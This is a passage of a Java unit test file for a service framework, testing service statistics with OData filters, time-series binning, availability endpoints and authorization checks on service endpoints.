assertTrue(retStatEntry.latestValue == 200);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"unit3\"));\n\n        // Step 7 - Issue a PATCH and verify that the latestValue is updated\n        stat.latestValue = 25;\n        this.host.sendAndWaitExpectSuccess(Operation.createPatch(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key3\");\n        assertTrue(retStatEntry.latestValue == 225);\n        assertTrue(retStatEntry.version == 2);\n\n        verifyGetWithODataOnStats(exampleServiceState);\n\n        verifyStatCreationAttemptAfterGet();\n\n    }\n\n    private void verifyGetWithODataOnStats(ExampleServiceState exampleServiceState) {\n        URI exampleStatsUri = UriUtils.buildStatsUri(this.host,\n                exampleServiceState.documentSelfLink);\n        // bulk PUT to set stats to a known state\n        ServiceStats stats = new ServiceStats();\n        stats.kind = ServiceStats.KIND;\n        ServiceStat stat = new ServiceStat();\n        stat.name = \"key1\";\n        stat.latestValue = 100;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"key2\";\n        stat.latestValue = 0.0;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"key3\";\n        stat.latestValue = -200;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"someKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY;\n        stat.latestValue = 1000;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"someOtherKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY;\n        stat.latestValue = 2000;\n        stats.entries.put(stat.name, stat);\n        this.host.sendAndWaitExpectSuccess(Operation.createPut(exampleStatsUri).setBody(stats));\n\n        // negative tests\n        URI exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_COUNT, Boolean.TRUE.toString());\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_ORDER_BY, \"name\");\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_SKIP_TO, \"100\");\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_TOP, \"100\");\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        // attempt long value LE on latestVersion, should fail\n        String odataFilterValue = String.format(\"%s le %d\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1001);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        // Positive filter tests\n        String statName = \"key1\";\n        // test filter for exact match\n        odataFilterValue = String.format(\"%s eq %s\",\n                ServiceStat.FIELD_NAME_NAME,\n                statName);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        ServiceStats filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 1);\n        assertTrue(filteredStats.entries.containsKey(statName));\n\n        // test filter with prefix match\n        odataFilterValue = String.format(\"%s eq %s*\",\n                ServiceStat.FIELD_NAME_NAME,\n                \"key\");\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // three entries start with \"key\"\n        assertTrue(filteredStats.entries.size() == 3);\n        assertTrue(filteredStats.entries.containsKey(\"key1\"));\n        assertTrue(filteredStats.entries.containsKey(\"key2\"));\n        assertTrue(filteredStats.entries.containsKey(\"key3\"));\n\n        // test filter with suffix match, common for time series filtering\n        odataFilterValue = String.format(\"%s eq *%s\",\n                ServiceStat.FIELD_NAME_NAME,\n                ServiceStats.STAT_NAME_SUFFIX_PER_DAY);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // two entries end with \"Day\"\n        assertTrue(filteredStats.entries.size() == 2);\n        assertTrue(filteredStats.entries\n                .containsKey(\"someKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY));\n        assertTrue(filteredStats.entries\n                .containsKey(\"someOtherKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY));\n\n        // filter on latestValue, GE\n        odataFilterValue = String.format(\"%s ge %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                0.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 4);\n\n        // filter on latestValue, GT\n        odataFilterValue = String.format(\"%s gt %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                0.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 3);\n\n        // filter on latestValue, eq\n        odataFilterValue = String.format(\"%s eq %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                -200.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 1);\n\n        // filter on latestValue, le\n        odataFilterValue = String.format(\"%s le %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1000.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 2);\n\n        // filter on latestValue, lt AND gt\n        odataFilterValue = String.format(\"%s lt %f and %s gt %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                2000.0,\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1000.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // two entries end with \"Day\"\n        assertTrue(filteredStats.entries.size() == 0);\n\n        // test dual filter with suffix match, and latest value LEQ\n        odataFilterValue = String.format(\"%s eq *%s and %s le %f\",\n                ServiceStat.FIELD_NAME_NAME,\n                ServiceStats.STAT_NAME_SUFFIX_PER_DAY,\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1001.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // single entry ends with \"Day\" and has latestValue <= 1000\n        assertTrue(filteredStats.entries.size() == 1);\n        assertTrue(filteredStats.entries\n                .containsKey(\"someKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY));\n\n    }\n\n    private void verifyStatCreationAttemptAfterGet() throws Throwable {\n        // Create a stat without a log histogram or time series, then try to recreate with\n        // the extra features and make sure its updated\n\n        List<Service> services = this.host.doThroughputServiceStart(\n                1, MinimalTestService.class,\n                this.host.buildMinimalTestState(), EnumSet.of(ServiceOption.INSTRUMENTATION), null);\n\n        final String statName = \"foo\";\n        for (Service service : services) {\n            service.setStat(statName, 1.0);\n            ServiceStat st = service.getStat(statName);\n            assertTrue(st.timeSeriesStats == null);\n            assertTrue(st.logHistogram == null);\n            ServiceStat stNew = new ServiceStat();\n            stNew.name = statName;\n            stNew.logHistogram = new ServiceStatLogHistogram();\n            stNew.timeSeriesStats = new TimeSeriesStats(60,\n                    TimeUnit.MINUTES.toMillis(1), EnumSet.of(AggregationType.AVG));\n            service.setStat(stNew, 11.0);\n            st = service.getStat(statName);\n            assertTrue(st.timeSeriesStats != null);\n            assertTrue(st.logHistogram != null);\n        }\n    }\n\n    private ServiceStats getStats(ExampleServiceState exampleServiceState) {\n        return this.host.getServiceState(null, ServiceStats.class, UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink));\n    }\n\n    private ServiceStats getStats(URI statsUri) {\n        return this.host.getServiceState(null, ServiceStats.class, statsUri);\n    }\n\n    @Test\n    public void testTimeSeriesStats() throws Throwable {\n        long startTime = TimeUnit.MILLISECONDS.toMicros(System.currentTimeMillis());\n        int numBins = 4;\n        long interval = 1000;\n        double value = 100;\n        // set data to fill up the specified number of bins\n        TimeSeriesStats timeSeriesStats = new TimeSeriesStats(numBins, interval,\n                EnumSet.allOf(AggregationType.class));\n        for (int i = 0; i < numBins; i++) {\n            startTime += TimeUnit.MILLISECONDS.toMicros(interval);\n            value += 1;\n            timeSeriesStats.add(startTime, value, 1);\n        }\n        assertTrue(timeSeriesStats.bins.size() == numBins);\n        // insert additional unique datapoints; the earliest entries should be dropped\n        for (int i = 0; i < numBins / 2; i++) {\n            startTime += TimeUnit.MILLISECONDS.toMicros(interval);\n            value += 1;\n            timeSeriesStats.add(startTime, value, 1);\n        }\n        assertTrue(timeSeriesStats.bins.size() == numBins);\n        long timeMicros = startTime - TimeUnit.MILLISECONDS.toMicros(interval * (numBins - 1));\n        long timeMillis = TimeUnit.MICROSECONDS.toMillis(timeMicros);\n        timeMillis -= (timeMillis % interval);\n        assertTrue(timeSeriesStats.bins.firstKey() == timeMillis);\n\n        // insert additional datapoints for an existing bin. The count should increase,\n        // min, max, average computed appropriately\n        double origValue = value;\n        double accumulatedValue = value;\n        double newValue = value;\n        double count = 1;\n        for (int i = 0; i < numBins / 2; i++) {\n            newValue++;\n            count++;\n            timeSeriesStats.add(startTime, newValue, 2);\n            accumulatedValue += newValue;\n        }\n        TimeBin lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg.equals(accumulatedValue / count));\n        assertTrue(lastBin.sum.equals((2 * count) - 1));\n        assertTrue(lastBin.count == count);\n        assertTrue(lastBin.max.equals(newValue));\n        assertTrue(lastBin.min.equals(origValue));\n        assertTrue(lastBin.latest.equals(newValue));\n\n        // test with a subset of the aggregation types specified\n        timeSeriesStats = new TimeSeriesStats(numBins, interval, EnumSet.of(AggregationType.AVG));\n        timeSeriesStats.add(startTime, value, value);\n        lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg != null);\n        assertTrue(lastBin.count != 0);\n        assertTrue(lastBin.sum == null);\n        assertTrue(lastBin.max == null);\n        assertTrue(lastBin.min == null);\n\n        timeSeriesStats = new TimeSeriesStats(numBins, interval, EnumSet.of(AggregationType.MIN,\n                AggregationType.MAX));\n        timeSeriesStats.add(startTime, value, value);\n        lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg == null);\n        assertTrue(lastBin.count == 0);\n        assertTrue(lastBin.sum == null);\n        assertTrue(lastBin.max != null);\n        assertTrue(lastBin.min != null);\n\n        timeSeriesStats = new TimeSeriesStats(numBins, interval, EnumSet.of(AggregationType.LATEST));\n        timeSeriesStats.add(startTime, value, value);\n        lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg == null);\n        assertTrue(lastBin.count == 0);\n        assertTrue(lastBin.sum == null);\n        assertTrue(lastBin.max == null);\n        assertTrue(lastBin.min == null);\n        assertTrue(lastBin.latest.equals(value));\n\n        // Step 2 - POST a stat to the service instance and verify we can fetch the stat just posted\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, 1,\n                ExampleServiceState.class, bodySetter, factoryURI);\n        ExampleServiceState exampleServiceState = states.values().iterator().next();\n        ServiceStats.ServiceStat stat = new ServiceStat();\n        stat.name = \"key1\";\n        stat.latestValue = 100;\n        // set bin size to 1ms\n        stat.timeSeriesStats = new TimeSeriesStats(numBins, 1, EnumSet.allOf(AggregationType.class));\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        for (int i = 0; i < numBins; i++) {\n            Thread.sleep(1);\n            this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                    this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        }\n        ServiceStats allStats = this.host.getServiceState(null, ServiceStats.class,\n                UriUtils.buildStatsUri(\n                        this.host, exampleServiceState.documentSelfLink));\n        ServiceStat retStatEntry = allStats.entries.get(stat.name);\n        assertTrue(retStatEntry.accumulatedValue == 100 * (numBins + 1));\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == numBins + 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.size() == numBins);\n\n        // Step 3 - POST a stat to the service instance with sourceTimeMicrosUtc and verify we can fetch the stat just posted\n        String statName = UUID.randomUUID().toString();\n        ExampleServiceState exampleState = new ExampleServiceState();\n        exampleState.name = statName;\n        Consumer<Operation> setter = (o) -> {\n            o.setBody(exampleState);\n        };\n        Map<URI, ExampleServiceState> stateMap = this.host.doFactoryChildServiceStart(null, 1,\n                ExampleServiceState.class, setter,\n                UriUtils.buildFactoryUri(this.host, ExampleService.class));\n        ExampleServiceState returnExampleState = stateMap.values().iterator().next();\n        ServiceStats.ServiceStat sourceStat1 = new ServiceStat();\n        sourceStat1.name = \"sourceKey1\";\n        sourceStat1.latestValue = 100;\n        // Timestamp 946713600000000 equals Jan 1, 2000\n        Long sourceTimeMicrosUtc1 = 946713600000000L;\n        sourceStat1.sourceTimeMicrosUtc = sourceTimeMicrosUtc1;\n        ServiceStats.ServiceStat sourceStat2 = new ServiceStat();\n        sourceStat2.name = \"sourceKey2\";\n        sourceStat2.latestValue = 100;\n        // Timestamp 946713600000000 equals Jan 2, 2000\n        Long sourceTimeMicrosUtc2 = 946800000000000L;\n        sourceStat2.sourceTimeMicrosUtc = sourceTimeMicrosUtc2;\n        // set bucket size to 1ms\n        sourceStat1.timeSeriesStats = new TimeSeriesStats(numBins, 1, EnumSet.allOf(AggregationType.class));\n        sourceStat2.timeSeriesStats = new TimeSeriesStats(numBins, 1, EnumSet.allOf(AggregationType.class));\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, returnExampleState.documentSelfLink)).setBody(sourceStat1));\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, returnExampleState.documentSelfLink)).setBody(sourceStat2));\n        allStats = getStats(returnExampleState);\n        retStatEntry = allStats.entries.get(sourceStat1.name);\n        assertTrue(retStatEntry.accumulatedValue == 100);\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.size() == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.firstKey()\n                .equals(TimeUnit.MICROSECONDS.toMillis(sourceTimeMicrosUtc1)));\n\n        retStatEntry = allStats.entries.get(sourceStat2.name);\n        assertTrue(retStatEntry.accumulatedValue == 100);\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.size() == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.firstKey()\n                .equals(TimeUnit.MICROSECONDS.toMillis(sourceTimeMicrosUtc2)));\n    }\n\n    public static class SetAvailableValidationService extends StatefulService {\n\n        public SetAvailableValidationService() {\n            super(ExampleServiceState.class);\n        }\n\n        @Override\n        public void handleStart(Operation op) {\n            setAvailable(false);\n            // we will transition to available only when we receive a special PATCH.\n            // This simulates a service that starts, but then self patch itself sometime\n            // later to indicate its done with some complex init. It does not do it in handle\n            // start, since it wants to make POST quick.\n            op.complete();\n        }\n\n        @Override\n        public void handlePatch(Operation op) {\n            // regardless of body, just become available\n            setAvailable(true);\n            op.complete();\n        }\n    }\n\n    @Test\n    public void failureOnReservedSuffixServiceStart() throws Throwable {\n        TestContext ctx = this.testCreate(ServiceHost.RESERVED_SERVICE_URI_PATHS.length);\n        for (String reservedSuffix : ServiceHost.RESERVED_SERVICE_URI_PATHS) {\n            Operation post = Operation.createPost(this.host,\n                    UUID.randomUUID().toString() + \"/\" + reservedSuffix)\n                    .setCompletion(ctx.getExpectedFailureCompletion());\n            this.host.startService(post, new MinimalTestService());\n        }\n        this.testWait(ctx);\n    }\n\n    @Test\n    public void testIsAvailableStatAndSuffix() throws Throwable {\n        long c = 1;\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, c,\n                ExampleServiceState.class, bodySetter, factoryURI);\n\n        // first verify that service that do not explicitly use the setAvailable method,\n        // appear available. Both a factory and a child service\n        this.host.waitForServiceAvailable(factoryURI);\n\n        // expect 200 from /factory/<child>/available\n        TestContext ctx = testCreate(states.size());\n        for (URI u : states.keySet()) {\n            Operation get = Operation.createGet(UriUtils.buildAvailableUri(u))\n                    .setCompletion(ctx.getCompletion());\n            this.host.send(get);\n        }\n        testWait(ctx);\n\n        // verify that PUT on /available can make it switch to unavailable (503)\n        ServiceStat body = new ServiceStat();\n        body.name = Service.STAT_NAME_AVAILABLE;\n        body.latestValue = 0.0;\n\n        Operation put = Operation.createPut(\n                UriUtils.buildAvailableUri(this.host, factoryURI.getPath()))\n                .setBody(body);\n        this.host.sendAndWaitExpectSuccess(put);\n\n        // verify factory now appears unavailable\n        Operation get = Operation.createGet(UriUtils.buildAvailableUri(factoryURI));\n        this.host.sendAndWaitExpectFailure(get);\n\n        // verify PUT on child services makes them unavailable\n        ctx = testCreate(states.size());\n        for (URI u : states.keySet()) {\n            put = put.clone().setUri(UriUtils.buildAvailableUri(u))\n                    .setBody(body)\n                    .setCompletion(ctx.getCompletion());\n            this.host.send(put);\n        }\n        testWait(ctx);\n\n        // expect 503 from /factory/<child>/available\n        ctx = testCreate(states.size());\n        for (URI u : states.keySet()) {\n            get = get.clone().setUri(UriUtils.buildAvailableUri(u))\n                    .setCompletion(ctx.getExpectedFailureCompletion());\n            this.host.send(get);\n        }\n        testWait(ctx);\n\n        // now validate a stateful service that is in memory, and explicitly calls setAvailable\n        // sometime after it starts\n        Service service = this.host.startServiceAndWait(new SetAvailableValidationService(),\n                UUID.randomUUID().toString(), new ExampleServiceState());\n\n        // verify service is NOT available, since we have not yet poked it, to become available\n        get = Operation.createGet(UriUtils.buildAvailableUri(service.getUri()));\n        this.host.sendAndWaitExpectFailure(get);\n\n        // send a PATCH to this special test service, to make it switch to available\n        Operation patch = Operation.createPatch(service.getUri())\n                .setBody(new ExampleServiceState());\n        this.host.sendAndWaitExpectSuccess(patch);\n\n        // verify service now appears available\n        get = Operation.createGet(UriUtils.buildAvailableUri(service.getUri()));\n        this.host.sendAndWaitExpectSuccess(get);\n    }\n\n    public void validateServiceUiHtmlResponse(Operation op) {\n        assertTrue(op.getStatusCode() == Operation.STATUS_CODE_MOVED_TEMP);\n        assertTrue(op.getResponseHeader(\"Location\").contains(\n                \"/core/ui/default/#\"));\n    }\n\n    public static void validateTimeSeriesStat(ServiceStat stat, long expectedBinDurationMillis) {\n        assertTrue(stat != null);\n        assertTrue(stat.timeSeriesStats != null);\n        assertTrue(stat.version >= 1);\n        assertEquals(expectedBinDurationMillis, stat.timeSeriesStats.binDurationMillis);\n        if (stat.timeSeriesStats.aggregationType.contains(AggregationType.AVG)) {\n            double maxCount = 0;\n            for (TimeBin bin : stat.timeSeriesStats.bins.values()) {\n                if (bin.count > maxCount) {\n                    maxCount = bin.count;\n                }\n            }\n            assertTrue(maxCount >= 1);\n        }\n    }\n\n    @Test\n    public void statsKeyOrder() {\n\n        ExampleServiceState state = new ExampleServiceState();\n        state.name = \"foo\";\n        Operation post = Operation.createPost(this.host, ExampleService.FACTORY_LINK).setBody(state);\n        state = this.sender.sendAndWait(post, ExampleServiceState.class);\n\n        ServiceStats stats = new ServiceStats();\n        ServiceStat stat = new ServiceStat();\n        stat.name = \"keyBBB\";\n        stat.latestValue = 10;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"keyCCC\";\n        stat.latestValue = 10;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"keyAAA\";\n        stat.latestValue = 10;\n        stats.entries.put(stat.name, stat);\n\n        URI exampleStatsUri = UriUtils.buildStatsUri(this.host, state.documentSelfLink);\n        this.sender.sendAndWait(Operation.createPut(exampleStatsUri).setBody(stats));\n\n        // odata stats prefix query\n        String odataFilterValue = String.format(\"%s eq %s*\", ServiceStat.FIELD_NAME_NAME, \"key\");\n        URI filteredStats = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        ServiceStats result = getStats(filteredStats);\n\n        // verify stats key order\n        assertEquals(3, result.entries.size());\n        List<String> statList = new ArrayList<>(result.entries.keySet());\n        assertEquals(\"stat index 0\", \"keyAAA\", statList.get(0));\n        assertEquals(\"stat index 1\", \"keyBBB\", statList.get(1));\n        assertEquals(\"stat index 2\", \"keyCCC\", statList.get(2));\n    }\n\n    @Test\n    public void endpointAuthorization() throws Throwable {\n        VerificationHost host = VerificationHost.create(0);\n        host.setAuthorizationService(new AuthorizationContextService());\n        host.setAuthorizationEnabled(true);\n        host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS.toMicros(100));\n        host.start();\n\n        TestRequestSender sender = host.getTestRequestSender();\n\n        host.setSystemAuthorizationContext();\n        host.waitForReplicatedFactoryServiceAvailable(UriUtils.buildUri(host, ExampleService.FACTORY_LINK));\n\n        String exampleUser = \"example@vmware.com\";\n        String examplePass = \"password\";\n        TestContext authCtx = host.testCreate(1);\n        AuthorizationSetupHelper.create()\n                .setHost(host)\n                .setUserEmail(exampleUser)\n                .setUserPassword(examplePass)\n                .setResourceQuery(Query.Builder.create()\n                        .addFieldClause(ServiceDocument.FIELD_NAME_KIND, Utils.buildKind(ExampleServiceState.class))\n                        .build())\n                .setCompletion(authCtx.getCompletion())\n                .start();\n        authCtx.await();\n\n        // create a sample service\n        ExampleServiceState doc = new ExampleServiceState();\n        doc.name = \"foo\";\n        doc.documentSelfLink = \"foo\";\n\n        Operation post = Operation.createPost(host, ExampleService.FACTORY_LINK).setBody(doc);\n        ExampleServiceState postResult = sender.sendAndWait(post, ExampleServiceState.class);\n\n        host.resetAuthorizationContext();\n\n        URI factoryAvailableUri = UriUtils.buildAvailableUri(host, ExampleService.FACTORY_LINK);\n        URI factoryStatsUri = UriUtils.buildStatsUri(host, ExampleService.FACTORY_LINK);\n        URI factoryConfigUri = UriUtils.buildConfigUri(host, ExampleService.FACTORY_LINK);\n        URI factorySubscriptionUri = UriUtils.buildSubscriptionUri(host, ExampleService.FACTORY_LINK);\n        URI factoryTemplateUri = UriUtils.buildUri(host, UriUtils.buildUriPath(ExampleService.FACTORY_LINK, SERVICE_URI_SUFFIX_TEMPLATE));\n        URI factorySynchUri = UriUtils.buildUri(host, UriUtils.buildUriPath(ExampleService.FACTORY_LINK, SERVICE_URI_SUFFIX_SYNCHRONIZATION));\n        URI factoryUiUri = UriUtils.buildUri(host, UriUtils.buildUriPath(ExampleService.FACTORY_LINK, SERVICE_URI_SUFFIX_UI));\n\n        URI serviceAvailableUri = UriUtils.buildAvailableUri(host, postResult.documentSelfLink);\n        URI serviceStatsUri = UriUtils.buildStatsUri(host, postResult.documentSelfLink);\n        URI serviceConfigUri = UriUtils.buildConfigUri(host, postResult.documentSelfLink);\n        URI serviceSubscriptionUri = UriUtils.buildSubscriptionUri(host, postResult.documentSelfLink);\n        URI serviceTemplateUri = UriUtils.buildUri(host, UriUtils.buildUriPath(postResult.documentSelfLink, SERVICE_URI_SUFFIX_TEMPLATE));\n        URI serviceSynchUri = UriUtils.buildUri(host, UriUtils.buildUriPath(postResult.documentSelfLink, SERVICE_URI_SUFFIX_SYNCHRONIZATION));\n        URI serviceUiUri = UriUtils.buildUri(host, UriUtils.buildUriPath(postResult.documentSelfLink, SERVICE_URI_SUFFIX_UI));\n\n        // check non-authenticated user receives forbidden response\n        FailureResponse failureResponse;\n        Operation uiOpResult;\n\n        // check factory endpoints\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(factoryAvailableUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(factoryStatsUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(factoryConfigUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(factorySubscriptionUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(factoryTemplateUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(factorySynchUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        uiOpResult = sender.sendAndWait(Operation.createGet(factoryUiUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, uiOpResult.getStatusCode());\n\n        // check service endpoints\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(serviceAvailableUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(serviceStatsUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(serviceConfigUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(serviceSubscriptionUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(serviceTemplateUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(serviceSynchUri));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        uiOpResult = sender.sendAndWait(Operation.createGet(serviceUiUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, uiOpResult.getStatusCode());\n\n\n        // check authenticated user does NOT receive forbidden response\n        AuthTestUtils.login(host, exampleUser, examplePass);\n\n        Operation response;\n\n        // check factory endpoints\n        response = sender.sendAndWait(Operation.createGet(factoryAvailableUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n        response = sender.sendAndWait(Operation.createGet(factoryStatsUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n        response = sender.sendAndWait(Operation.createGet(factoryConfigUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n        response = sender.sendAndWait(Operation.createGet(factorySubscriptionUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n        response = sender.sendAndWait(Operation.createGet(factoryTemplateUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(factorySynchUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        response = sender.sendAndWait(Operation.createGet(factoryUiUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n\n        // check service endpoints\n        response = sender.sendAndWait(Operation.createGet(serviceAvailableUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n        response = sender.sendAndWait(Operation.createGet(serviceStatsUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n        response = sender.sendAndWait(Operation.createGet(serviceConfigUri));\n        